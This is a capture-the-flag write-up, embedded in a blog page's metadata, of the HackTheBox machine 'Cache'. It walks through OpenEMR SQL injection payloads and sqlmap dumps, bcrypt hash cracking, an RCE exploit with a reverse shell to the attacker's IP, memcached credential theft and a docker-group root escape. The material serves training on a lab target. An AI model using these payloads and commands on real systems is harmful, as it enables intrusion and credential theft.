<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Cache | CyFun</title><meta name=keywords content="ctf,hackthebox,penetration-testing,writeup,linux,medium"><meta name=description content="Cache HackTheBox writeup"><meta name=author content="s4ch"><link rel=canonical href=https://s4ch.github.io/writeups/hackthebox/cache/><link crossorigin=anonymous href=/assets/css/stylesheet.c5de734fbd88c3d21543485ffbcb1ccdda89a86a780cf987fa00199c41dbc947.css integrity="sha256-xd5zT72Iw9IVQ0hf+8sczdqJqGp4DPmH+gAZnEHbyUc=" rel="preload stylesheet" as=style><link rel=icon href=https://s4ch.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://s4ch.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://s4ch.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://s4ch.github.io/apple-touch-icon.png><link rel=mask-icon href=https://s4ch.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://s4ch.github.io/writeups/hackthebox/cache/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="Cache "><meta property="og:description" content="Cache HackTheBox writeup"><meta property="og:type" content="article"><meta property="og:url" content="https://s4ch.github.io/writeups/hackthebox/cache/"><meta property="og:image" content="https://s4ch.github.io/writeups/hackthebox/cache/cache.png"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2020-10-10T19:09:00+00:00"><meta property="article:modified_time" content="2025-08-18T17:55:49+05:30"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/tenet/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/scriptkiddie/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/delivery/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/ready/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/laboratory/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/passage/"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://s4ch.github.io/writeups/hackthebox/cache/cache.png"><meta name=twitter:title content="Cache "><meta name=twitter:description content="Cache HackTheBox writeup"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Writeups","item":"https://s4ch.github.io/writeups/"},{"@type":"ListItem","position":2,"name":"HackTheBox Writeups","item":"https://s4ch.github.io/writeups/hackthebox/"},{"@type":"ListItem","position":3,"name":"Cache ","item":"https://s4ch.github.io/writeups/hackthebox/cache/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Cache ","name":"Cache ","description":"Cache HackTheBox writeup","keywords":["ctf","hackthebox","penetration-testing","writeup","linux","medium"],"articleBody":"Information Name: Cache Profile: www.hackthebox.eu Difficulty: Medium OS: Linux Points: 30 Overview Install tools used in this WU on BlackArch Linux:\n$ pacman -S nmap lynx ffuf exploitdb metasploit sqlmap john docker Network enumeration Quick nmap scan:\n# Nmap 7.80 scan initiated Fri Jun 12 13:19:40 2020 as: nmap -sSVC -p- -oA nmap_full 10.10.10.188 Nmap scan report for 10.10.10.188 Host is up (0.021s latency). Not shown: 65533 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 a9:2d:b2:a0:c4:57:e7:7c:35:2d:45:4d:db:80:8c:f1 (RSA) | 256 bc:e4:16:3d:2a:59:a1:3a:6a:09:28:dd:36:10:38:08 (ECDSA) |_ 256 57:d5:47:ee:07:ca:3a:c0:fd:9b:a8:7f:6b:4c:9d:7c (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Cache Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Jun 12 13:20:07 2020 -- 1 IP address (1 host up) scanned in 26.73 seconds Let’s set the local domain in /etc/hosts:\n$ cat /etc/hosts | grep cache 10.10.10.188 cache.htb HTTP enumeration \u0026 discovery Let’s see which pages are listed on the home page:\n$ lynx -dump -listonly -nonumbers http://cache.htb/index.html http://cache.htb/index.html http://cache.htb/news.html http://cache.htb/contactus.html http://cache.htb/login.html http://cache.htb/author.html If we look at the source of login.html we can see this script is included:\n\u003cscript src=\"jquery/functionality.js\"\u003e\u003c/script\u003e $(function(){ var error_correctPassword = false; var error_username = false; function checkCorrectPassword(){ var Password = $(\"#password\").val(); if(Password != 'H@v3_fun'){ alert(\"Password didn't Match\"); error_correctPassword = true; } } function checkCorrectUsername(){ var Username = $(\"#username\").val(); if(Username != \"ash\"){ alert(\"Username didn't Match\"); error_username = true; } } $(\"#loginform\").submit(function(event) { /* Act on the event */ error_correctPassword = false; checkCorrectPassword(); error_username = false; checkCorrectUsername(); if(error_correctPassword == false \u0026\u0026 error_username ==false){ return true; } else{ return false; } }); }); So the creds are:\nusername: ash password: H@v3_fun That let us access to http://cache.htb/net.html, a page under construction. This is just a troll.\nAt http://cache.htb/author.html, the author is talking about another project: HMS.\nhms page or directory don’t exist; lets’ try to enumerate more with ffuf.\n$ ffuf -u http://cache.htb/FUZZ -r -c -w ~/CTF/tools/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt -e .txt,.html -fc 403 /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.1.0-git ________________________________________________ :: Method : GET :: URL : http://cache.htb/FUZZ :: Wordlist : FUZZ: /home/cyfun/CTF/tools/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt :: Extensions : .txt .html :: Follow redirects : true :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403 :: Filter : Response status: 403 ________________________________________________ login.html [Status: 200, Size: 2421, Words: 389, Lines: 106] index.html [Status: 200, Size: 8193, Words: 902, Lines: 339] news.html [Status: 200, Size: 7231, Words: 948, Lines: 100] author.html [Status: 200, Size: 1522, Words: 180, Lines: 68] . [Status: 200, Size: 8193, Words: 902, Lines: 339] contactus.html [Status: 200, Size: 2539, Words: 283, Lines: 148] jquery [Status: 200, Size: 951, Words: 65, Lines: 17] net.html [Status: 200, Size: 290, Words: 23, Lines: 19] :: Progress: [114801/114801] :: Job [1/1] :: 1739 req/sec :: Duration: [0:01:06] :: Errors: 0 :: That didn’t gave us new pages. In fact guessing was required to find another virtual host.\n$ ffuf -u http://10.10.10.188/ -r -c -w ~/CTF/tools/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt -H 'Host: FUZZ.htb' -fs 8193 /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.1.0-git ________________________________________________ :: Method : GET :: URL : http://10.10.10.188/ :: Wordlist : FUZZ: /home/cyfun/CTF/tools/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt :: Header : Host: FUZZ.htb :: Follow redirects : true :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403 :: Filter : Response size: 8193 ________________________________________________ hms [Status: 200, Size: 7850, Words: 1925, Lines: 159] :: Progress: [38267/38267] :: Job [1/1] :: 911 req/sec :: Duration: [0:00:42] :: Errors: 0 :: Let’s add this entry in /etc/hosts too.\n$ cat /etc/hosts | grep hms 10.10.10.188 hms.htb We are quickly redirected to http://hms.htb/interface/login/login.php?site=default\nHTTP exploitation (OpenEMR): SQLi Its seems we have an openEMR instance.\nThere are many exploits but we don’t know which version this is.\nUsually I never go to EDB website and only use searchsploit, but this time we don’t know the version used, the only thing we know is that is was a version probably released in 2018 as the copyright is from 2018.\nBy searching on EDB website, we have the date of publication of the exploit. So with some luck we can begin with the exploits published in 2018.\nhttps://www.exploit-db.com/search?q=openemr\nBut those two exploits require authentication. No luck.\nSo let’s see what exploits are also in [Metasploit][msf]:\nmsf5 \u003e search openemr Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 auxiliary/sqli/openemr/openemr_sqli_dump 2019-05-17 normal Yes OpenEMR 5.0.1 Patch 6 SQLi Dump 1 exploit/unix/webapp/openemr_sqli_privesc_upload 2013-09-16 excellent Yes OpenEMR 4.1.1 Patch 14 SQLi Privilege Escalation Remote Code Execution 2 exploit/unix/webapp/openemr_upload_exec 2013-02-13 excellent Yes OpenEMR PHP File Upload Vulnerability The first one seems promising, let’s set it up:\nmsf5 auxiliary(sqli/openemr/openemr_sqli_dump) \u003e options Module options (auxiliary/sqli/openemr/openemr_sqli_dump): Name Current Setting Required Description ---- --------------- -------- ----------- Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS 10.10.10.188 yes The target host(s), range CIDR identifier, or hosts file with syntax 'file:' RPORT 80 yes The target port (TCP) SSL false no Negotiate SSL/TLS for outgoing connections TARGETURI / yes The base path to the OpenEMR installation VHOST hms.htb no HTTP server virtual host When we run it we can see the exploit works, but it seems poorly written because it is trying to dump all system tables (295) and it’s pretty slow.\nmsf5 auxiliary(sqli/openemr/openemr_sqli_dump) \u003e run [*] Running module against 10.10.10.188 [*] DB Version: 5.7.30-0ubuntu0.18.04.1 [*] Enumerating tables, this may take a moment... [*] Identified 295 tables. [*] Dumping table (1/295): CHARACTER_SETS [*] Dumping table (2/295): COLLATIONS So let’s exit that, the msf module will take hours to extract all those useless tables.\nNow we know the this SQLi is working let’s see what exploit it is exactly:\nmsf5 auxiliary(sqli/openemr/openemr_sqli_dump) \u003e info Name: OpenEMR 5.0.1 Patch 6 SQLi Dump Module: auxiliary/sqli/openemr/openemr_sqli_dump License: Metasploit Framework License (BSD) Rank: Normal Disclosed: 2019-05-17 Provided by: Will Porter Check supported: Yes Basic options: Name Current Setting Required Description ---- --------------- -------- ----------- Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS 10.10.10.188 yes The target host(s), range CIDR identifier, or hosts file with syntax 'file:' RPORT 80 yes The target port (TCP) SSL false no Negotiate SSL/TLS for outgoing connections TARGETURI / yes The base path to the OpenEMR installation VHOST hms.htb no HTTP server virtual host Description: This module exploits a SQLi vulnerability found in OpenEMR version 5.0.1 Patch 6 and lower. The vulnerability allows the contents of the entire database (with exception of log and task tables) to be extracted. This module saves each table as a `.csv` file in your loot directory and has been tested with OpenEMR 5.0.1 (3). References: https://cvedetails.com/cve/CVE-2018-17179/ https://github.com/openemr/openemr/commit/3e22d11c7175c1ebbf3d862545ce6fee18f70617 In metasploit you can use the edit command to open your default editor on the source code of the module. By doing that I read the code of the msf module and saw how to detect openEMR version with method openemr_version:\ndef openemr_version res = send_request_cgi( 'method' =\u003e 'GET', 'uri' =\u003e normalize_uri(uri, 'admin.php') ) vprint_status(\"admin.php response code: #{res.code}\") document = Nokogiri::HTML(res.body) document.css('tr')[1].css('td')[3].text rescue StandardError '' end Let’s just go to http://hms.htb/admin.php to check the version installed:\nWe have exactly 5.0.1 (3).\nNow by reading get_response method we know which endpoint is requested and which parameter is vulnerable.\ndef get_response(payload) response = send_request_cgi( 'method' =\u003e 'GET', 'uri' =\u003e normalize_uri(uri, 'interface', 'forms', 'eye_mag', 'taskman.php'), 'vars_get' =\u003e { 'action' =\u003e 'make_task', 'from_id' =\u003e '1', 'to_id' =\u003e '1', 'pid' =\u003e '1', 'doc_type' =\u003e '1', 'doc_id' =\u003e '1', 'enc' =\u003e \"1' and updatexml(1,concat(0x7e, (#{payload})),0) or '\" } ) response end Before dumping anything we can verify manually the URL:\nFine, we can now fire [sqlmap][sqlmap], retrieve DBMS banner:\n$ sqlmap -u 'http://hms.htb/interface/forms/eye_mag/taskman.php?action=make_task\u0026from_id=1\u0026to_id=1\u0026pid=1\u0026doc_type=1\u0026doc_id=1\u0026enc=1' -p enc -b --random-agent ___ __H__ ___ ___[(]_____ ___ ___ {1.4.4#stable} |_ -| . [.] | .'| . | |___|_ [,]_|_|_|__,| _| |_|V... |_| http://sqlmap.org [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program [*] starting @ 21:51:36 /2020-07-14/ [21:51:36] [INFO] fetched random HTTP User-Agent header value 'Opera/8.51 (X11; Linux i686; U; en)' from file '/opt/sqlmap/data/txt/user-agents.txt' [21:51:37] [INFO] testing connection to the target URL you have not declared cookie(s), while server wants to set its own ('OpenEMR=b9g6um1rbhc...dmd5cln601'). Do you want to use those [Y/n] n [21:52:08] [CRITICAL] previous heuristics detected that the target is protected by some kind of WAF/IPS [21:52:08] [INFO] testing if the target URL content is stable [21:52:38] [CRITICAL] connection timed out to the target URL. sqlmap is going to retry the request(s) [21:54:08] [CRITICAL] connection timed out to the target URL [21:54:08] [WARNING] target URL content is not stable (i.e. content differs). sqlmap will base the page comparison on a sequence matcher. If no dynamic nor injectable parameters are detected, or in case of junk results, refer to user's manual paragraph 'Page comparison' how do you want to proceed? [(C)ontinue/(s)tring/(r)egex/(q)uit] c [21:54:24] [CRITICAL] can't check dynamic content because of lack of page content [21:54:24] [INFO] heuristic (basic) test shows that GET parameter 'enc' might be injectable (possible DBMS: 'MySQL') [21:54:24] [INFO] testing for SQL injection on GET parameter 'enc' it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] n [21:54:32] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause' [21:55:29] [WARNING] there is a possibility that the target (or WAF/IPS) is dropping 'suspicious' requests [21:55:29] [CRITICAL] connection timed out to the target URL. sqlmap is going to retry the request(s) [21:56:25] [CRITICAL] connection timed out to the target URL. sqlmap is going to retry the request(s) [21:57:55] [CRITICAL] connection timed out to the target URL [21:58:25] [CRITICAL] connection timed out to the target URL. sqlmap is going to retry the request(s) [21:59:55] [CRITICAL] connection timed out to the target URL [22:00:25] [CRITICAL] connection timed out to the target URL. sqlmap is going to retry the request(s) [22:01:55] [CRITICAL] connection timed out to the target URL [22:02:25] [CRITICAL] connection timed out to the target URL. sqlmap is going to retry the request(s) there seems to be a continuous problem with connection to the target. Are you sure that you want to continue? [y/N] N [22:03:36] [ERROR] user quit [22:03:36] [WARNING] you haven't updated sqlmap for more than 84 days!!! [*] ending @ 22:03:36 /2020-07-14/ It’s kinda working but pretty slow and unstable, so let’s find another endpoint as it seems there are many SQLi.\nThere is a document OpenEMR v5.0.1.3 - Vulnerability Report for exactly the same version as us. A dozen of SQLi are listed here.\nportal/find_appt_popup_user.php?catid=1' AND (SELECT 0FROM(SELECT COUNT(*),CONCAT(@@VERSION,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- - portal/add_edit_event_user.php?eid=1 AND EXTRACTVALUE(0,CONCAT(0x5c,VERSION())) interface/forms/eye_mag/php/Anything_simple.php?display=i\u0026encounter=1' AND (SELECT 0 FROM(SELECT COUNT(*),CONCAT(@@VERSION,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- -\u0026category_name=POSTSEG interface/forms_admin/forms_admin.php?id=32' OR (SELECT 0 FROM(SELECT COUNT(*),CONCAT(@@VERSION,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- -\u0026method=enable interface/de_identification_forms/find_code_popup.php?search_status=1\u0026search_term=')+or+updatexml(null,concat(0x0a,version()),null)--+-\u0026bn_search=Search interface/de_identification_forms/find_immunization_popup.php?search_status=1\u0026search_term=')+or+updatexml(null,concat(0x0a,version()),null)--+-\u0026bn_search=Search interface/de_identification_forms/find_code_popup.php?search_status=1\u0026search_term=')+or+updatexml(null,concat(0x0a,version()),null)--+-\u0026bn_search=Search The ones in 3.1 and 3.2 (portal) seems to give a SQL error while those from 3.3 to 3.9 seem to require authentication.\nThose two request won’t works because we need valid cookies even if the attack is unauthenticated. Also we need to fill the registration form with random data even if we never receive the confirmation email, this will set a valid cookie.\n$ sqlmap -u 'http://hms.htb/portal/add_edit_event_user.php?eid=1' -p eid --random-agent --threads 10 --batch -b $ sqlmap -u 'http://hms.htb/portal/find_appt_popup_user.php?catid=1' -p catid --random-agent --threads 10 --batch -b So we have to add the --cookie option:\n$ sqlmap -u 'http://hms.htb/portal/add_edit_event_user.php?eid=1' -p eid --cookie 'OpenEMR=jcn4a7ce07kbngbo7r9rolttgu; PHPSESSID=fcfeq8h77phga1bs6b1cshh64e' --random-agent --threads 10 --batch -b ___ __H__ ___ ___[.]_____ ___ ___ {1.4.4#stable} |_ -| . [,] | .'| . | |___|_ [)]_|_|_|__,| _| |_|V... |_| http://sqlmap.org [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program [*] starting @ 23:28:23 /2020-07-14/ [23:28:23] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows NT 5.2) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.792.0 Safari/535.1' from file '/opt/sqlmap/data/txt/user-agents.txt' [23:28:23] [INFO] resuming back-end DBMS 'mysql' [23:28:23] [INFO] testing connection to the target URL [23:28:23] [WARNING] there is a DBMS error found in the HTTP response body which could interfere with the results of the tests sqlmap resumed the following injection point(s) from stored session: --- Parameter: eid (GET) Type: boolean-based blind Title: Boolean-based blind - Parameter replace (original value) Payload: eid=(SELECT (CASE WHEN (8435=8435) THEN 1 ELSE (SELECT 1164 UNION SELECT 9741) END)) Type: error-based Title: MySQL \u003e= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE) Payload: eid=1 AND EXTRACTVALUE(4452,CONCAT(0x5c,0x71787a7a71,(SELECT (ELT(4452=4452,1))),0x717a716271)) Type: time-based blind Title: MySQL \u003e= 5.0.12 AND time-based blind (query SLEEP) Payload: eid=1 AND (SELECT 5294 FROM (SELECT(SLEEP(5)))KKhg) Type: UNION query Title: Generic UNION query (NULL) - 4 columns Payload: eid=1 UNION ALL SELECT NULL,NULL,CONCAT(0x71787a7a71,0x73535a4b567775646f4d7849526d4b6d4a697572466f44734446724d5072526b7079474c6a616242,0x717a716271),NULL-- - --- [23:28:23] [INFO] the back-end DBMS is MySQL [23:28:23] [INFO] fetching banner back-end DBMS operating system: Linux Ubuntu back-end DBMS: MySQL \u003e= 5.1 banner: '5.7.30-0ubuntu0.18.04.1' [23:28:23] [INFO] fetched data logged to text files under '/home/cyfun/.sqlmap/output/hms.htb' [23:28:23] [WARNING] you haven't updated sqlmap for more than 84 days!!! [*] ending @ 23:28:23 /2020-07-14/ Alternatively you can store the raw HTTP request in a file:\nGET /portal/add_edit_event_user.php?eid=1 HTTP/1.1 Host: hms.htb User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: keep-alive Cookie: OpenEMR=jcn4a7ce07kbngbo7r9rolttgu; PHPSESSID=fcfeq8h77phga1bs6b1cshh64e Upgrade-Insecure-Requests: 1 Cache-Control: max-age=0 And then tell sqlmap to use this req file:\n$ sqlmap -r \"$(pwd)/sqli.req\" --random-agent --threads 10 --batch -b Now let’s use sqlmap dump options.\n--dbs\navailable databases [2]: [*] information_schema [*] openemr -D openemr --tables\nDatabase: openemr [234 tables] +---------------------------------------+ | array | | groups | | sequences | ... | user_settings | | users | | users_facility | | users_secure | | valueset | | voids | | x12_partners | +---------------------------------------+ -D openemr -T users --columns\n-D openemr -T users -C username,password --dump\nDatabase: openemr Table: users [3 entries] +-----------------+--------------+ | username | password | +-----------------+--------------+ | openemr_admin | NoLongerUsed | | phimail-service | NoLogin | | portal-user | NoLogin | +-----------------+--------------+ It seems not to be the right table, lets’ try this one instead.\n-D openemr -T users_secure -C username,password --dump\nDatabase: openemr Table: users_secure [1 entry] +---------------+--------------------------------------------------------------+ | username | password | +---------------+--------------------------------------------------------------+ | openemr_admin | $2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B. | +---------------+--------------------------------------------------------------+ Let’s put the hash in a file to crack it with [JtR][JtR]:\n$ printf %s '$2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B.' \u003e hash.txt $ john -w /usr/share/wordlists/password/rockyou.txt --format=bcrypt hash.txt Warning: invalid UTF-8 seen reading /usr/share/wordlists/password/rockyou.txt Using default input encoding: UTF-8 Loaded 1 password hash (bcrypt [Blowfish 32/64 X3]) Cost 1 (iteration count) is 32 for all loaded hashes Will run 2 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status xxxxxx (?) 1g 0:00:00:01 DONE (2020-07-15 00:51) 0.6369g/s 722.2p/s 722.2c/s 722.2C/s water..zombie Use the \"--show\" option to display all of the cracked passwords reliably Session completed $ john --show hash.txt ?:xxxxxx 1 password hash cracked, 0 left Now we have some creds: openemr_admin / xxxxxx.\nHTTP exploitation (OpenEMR): RCE Now we will be able to use the authenticated RCE we found earlier.\nWarning: Using EDB-48515 that has a neutral impact rather than EDB-45161 that will reset the config to default for everyone!!!\n$ searchsploit -m 48515 Exploit: OpenEMR 5.0.1 - Remote Code Execution URL: https://www.exploit-db.com/exploits/48515 Path: /usr/share/exploitdb/exploits/php/webapps/48515.py File Type: ASCII text, with CRLF line terminators Copied to: /home/cyfun/CTF/HackTheBox/machines/Cache/48515.py Let’s modify, the remote URL, the LHOST, LPORT, and admin creds.\nThen start a listener \u0026 start the exploit:\n$ pwncat -l 8888 -vv INFO: Listening on :::8888 (family 10/IPv6, TCP) INFO: Listening on 0.0.0.0:8888 (family 2/IPv4, TCP) INFO: Client connected from 10.10.10.188:32838 (family 2/IPv4, TCP) Linux cache 4.15.0-109-generic #110-Ubuntu SMP Tue Jun 23 02:39:32 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux 23:11:40 up 32 min, 0 users, load average: 0.07, 0.02, 0.03 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=33(www-data) gid=33(www-data) groups=33(www-data) /bin/sh: 0: can't access tty; job control turned off $ $ python2 48515.py [+] Authentication with credentials provided please be patient [+] Uploading a payload it will take a minute [+] You should be getting a shell Afterward I created my own exploit for OpenEMR RCE: https://github.com/cyfun/OpenEMR-RCE\n$ ruby OpenEMR-RCE/exploit.rb auto -r http://hms.htb -u openemr_admin -p xxxxxx -h 10.10.15.201 -t 8888 $ ruby OpenEMR-RCE/exploit.rb semi-auto -r http://hms.htb -u openemr_admin -p xxxxxx -h 10.10.15.201 -t 8888 -m 'php/reverse_php' $ ruby OpenEMR-RCE/exploit.rb manual -r http://hms.htb -u openemr_admin -p xxxxxx -s tmp548.php Privilege Escalation of Machine : www-data to ash We can use the credentials (ash / H@v3_fun) we found at the beginning.\n$ which python3 /usr/bin/python3 $ python3 -c 'import pty;pty.spawn(\"/bin/bash\")' www-data@cache:/$ su ash su ash Password: H@v3_fun ash@cache:/$ cd cd ash@cache:~$ cat user.txt cat user.txt aebbdcd5e2a33812b7db84f42f124ea5 But this is totally optional it’s possible to jump over this step and directly elevate to user luffy from www-data.\nPrivilege Escalation of Machine : ash to luffy Let’s see open TCP sockets:\n$ ss -nlpt State Recv-Q Send-Q Local Address:Port Peer Address:Port LISTEN 0 128 127.0.0.53%lo:53 0.0.0.0:* LISTEN 0 128 0.0.0.0:22 0.0.0.0:* LISTEN 0 80 127.0.0.1:3306 0.0.0.0:* LISTEN 0 128 127.0.0.1:11211 0.0.0.0:* LISTEN 0 128 [::]:22 [::]:* LISTEN 0 128 [::]:11211 [::]:* LISTEN 0 128 *:80 *:* Ohoh we have port 11211 used by memcached.\nWe can confirm the process is running:\n$ ps -ef f | grep memcached memcache 1125 1 0 22:39 ? Ssl 0:00 /usr/bin/memcached -m 64 -p 11211 -u memcache -l 127.0.0.1 -P /var/run/memcached/memcached.pid ash 6235 5474 0 23:30 pts/1 S+ 0:00 | \\_ grep --color=auto memcached www-data 4693 4669 0 23:04 ? Sl 0:00 | \\_ memcached Let’s check some advices on HackTricks: 11211 - Pentesting Memcache\n$ telnet 127.0.0.1 11211 telnet 127.0.0.1 11211 Trying 127.0.0.1... Connected to 127.0.0.1. Escape character is '^]'. version version VERSION 1.5.6 Ubuntu stats items stats items STAT items:1:number 5 ... stats cachedump 1 0 stats cachedump 1 0 ITEM link [21 b; 0 s] ITEM user [5 b; 0 s] ITEM passwd [9 b; 0 s] ITEM file [7 b; 0 s] ITEM account [9 b; 0 s] END get user get user VALUE user 0 5 luffy END get passwd get passwd VALUE passwd 0 9 0n3_p1ec3 END get file get file VALUE file 0 7 nothing END get account get account VALUE account 0 9 afhj556uo END quit quit Now we can use the creds: luffy / 0n3_p1ec3.\n$ su luffy su luffy Password: 0n3_p1ec3 luffy@cache:/$ cd cd luffy@cache:~$ Privilege Escalation of Machine : luffy to root We can see there is docker running and the user is in docker group.\n$ id uid=1001(luffy) gid=1001(luffy) groups=1001(luffy),999(docker) $ ps -ef f | grep docker ps -ef f | grep docker root 918 1 0 22:39 ? Ssl 0:05 /usr/bin/dockerd -H fd:// root 1358 918 0 22:39 ? Ssl 0:04 \\_ containerd --config /var/run/docker/containerd/containerd.toml --log-level info root 6934 1358 0 23:45 ? Sl 0:00 \\_ containerd-shim -namespace moby -workdir /var/lib/docker/containerd/daemon/io.containerd.runtime.v1.linux/moby/f211bc4cffb910b8c45b09d9eeec6c9483af4fff6222a5ca7c211aef6ca3bc94 -address /var/run/docker/containerd/containerd.sock -containerd-binary /usr/bin/containerd -runtime-root /var/run/docker/runtime-runc Being in docker group is like being root because of the capabilities.\nMy reflex is to check GTFOBins if there are some ready to use payloads for pe, and there is.\nLet’s find what images are available:\n$ docker images docker images REPOSITORY TAG IMAGE ID CREATED SIZE ubuntu latest 2ca708c1c9cc 10 months ago 64.2MB So let’s spawn a shell through a shared volume:\nluffy@cache:~$ docker run -v /:/mnt --rm -it ubuntu chroot /mnt bash docker run -v /:/mnt --rm -it ubuntu chroot /mnt bash root@ae6411b77a1e:/# cd cd root@ae6411b77a1e:~# cat root.txt cat root.txt 44f998eb5112e763883b6ae36279a432 root@ae6411b77a1e:~# cat /etc/shadow | grep root cat /etc/shadow | grep root root:$6$bWa.Lbnz$k0KbMyNbdOQRcY5pWuHM2bfkF5ek8c0CTNsi00qFHmp04NqcefCsIXZTdJgqToRar5zcEk5k8KFhbIomGB3Kb/:18178:0:99999:7::: ","wordCount":"3364","inLanguage":"en","image":"https://s4ch.github.io/writeups/hackthebox/cache/cache.png","datePublished":"2020-10-10T19:09:00Z","dateModified":"2025-08-18T17:55:49+05:30","author":{"@type":"Person","name":"s4ch"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://s4ch.github.io/writeups/hackthebox/cache/"},"publisher":{"@type":"Organization","name":"CyFun","logo":{"@type":"ImageObject","url":"https://s4ch.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://s4ch.github.io/ accesskey=h title="CyFun (Alt + H)">CyFun</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
